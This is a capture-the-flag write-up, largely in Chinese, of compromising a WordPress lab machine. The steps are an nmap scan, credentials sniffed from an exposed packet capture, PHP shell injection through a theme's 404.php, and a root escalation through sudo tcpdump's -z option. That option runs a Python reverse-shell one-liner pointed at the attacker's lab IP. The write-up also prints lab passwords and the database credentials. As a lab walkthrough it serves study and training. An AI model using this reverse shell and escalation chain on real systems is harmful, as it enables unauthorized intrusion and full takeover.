## port scan

```shell
# Nmap 7.94SVN scan initiated Wed Jan 22 03:31:12 2025 as: nmap -sT -sVC -O -p22,80 -oN nmap_result/detils 192.168.56.142
Nmap scan report for 192.168.56.142 (192.168.56.142)
Host is up (0.00067s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d2:ac:73:4c:17:ec:6a:82:79:87:5a:f9:22:d4:12:cb (RSA)
|   256 9c:d5:f3:2c:e2:d0:06:cc:8c:15:5a:5a:81:5b:03:3d (ECDSA)
|_  256 ab:67:56:69:27:ea:3e:3b:33:73:32:f8:ff:2e:1f:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 4.9.8
|_http-title: Example site &#8211; Just another WordPress site
|_http-server-header: Apache/2.4.29 (Ubuntu)
MAC Address: 08:00:27:CC:54:C9 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## web

WordPress 4.9.8

目录扫描到：http://192.168.56.142/ipdata/

wireshark分析，拿到凭据

![image-20250122173328324](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250122173328324.png)

`webdeveloper:Te5eQg&4sBS!Yr$)wf%(DcAd`

登录后台

然后我尝试修改主题进行反弹shell，但是

```
Unable to communicate back with site to check for fatal errors, so the PHP change was reverted. You will need to upload your PHP file change by some other means, such as by using SFTP.
```

然后我就修改插件插入php代码

http://192.168.56.142/wp-content/plugins/akismet/akismet.php

看完wp发现，只需要修改为另一个主题就可以成功插入php代码

http://192.168.56.142//wp-content/themes/twentysixteen/404.php

## 提权

```shell
webdeveloper@webdeveloper:/tmp$ ss -lntp
ss -lntp
State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port    
LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*       
LISTEN   0         128                 0.0.0.0:22               0.0.0.0:*       
LISTEN   0         80                127.0.0.1:3306             0.0.0.0:*       
LISTEN   0         128                    [::]:22                  [::]:*       
LISTEN   0         128                       *:80                     *:*
```

存在mysql服务

查看`wp-config.php`，找到账号密码

```
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'webdeveloper');

/** MySQL database password */
define('DB_PASSWORD', 'MasterOfTheUniverse');
```

`webdeveloper:MasterOfTheUniverse`

登录ssh

**sudo tcpdump 提权**

```shell
webdeveloper@webdeveloper:~$ sudo -l
[sudo] password for webdeveloper: 
Matching Defaults entries for webdeveloper on webdeveloper:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webdeveloper may run the following commands on webdeveloper:
    (root) /usr/sbin/tcpdump
```

```shell
webdeveloper@webdeveloper:~$ cat 1.sh 
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.138",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
webdeveloper@webdeveloper:~$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /home/webdeveloper/1.sh -Z root
```

```shell
root@webdeveloper:/root# cat flag.txt 
Congratulations here is youre flag:
cba045a5a4f26f1cd8d7be9a5c2b1b34f6c5d290
```

